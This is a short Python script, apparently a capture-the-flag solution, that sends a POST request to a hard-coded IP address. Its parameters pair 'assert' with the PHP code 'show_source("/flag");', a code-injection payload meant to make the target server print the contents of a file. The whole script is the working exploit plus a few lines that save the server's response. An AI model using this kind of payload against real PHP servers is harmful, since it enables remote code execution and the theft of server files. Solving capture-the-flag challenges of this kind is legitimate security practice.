# -*- utf-8 -*-
# @Time : 2020/1/8
# @Author : yaozh16
# @File : code.py
# @Software: PyCharm
# @Description: 

import requests
if __name__ == "__main__":
    data = {
        "hello":"assert",
        "world":"show_source(\"/flag\");"
    }
    sess = requests.session()
    response = sess.post("http://202.112.51.130:28083/?i=security", data=data)
    with open("response.html",'w',encoding="utf8") as f:
        f.write(response.text)
        f.close()
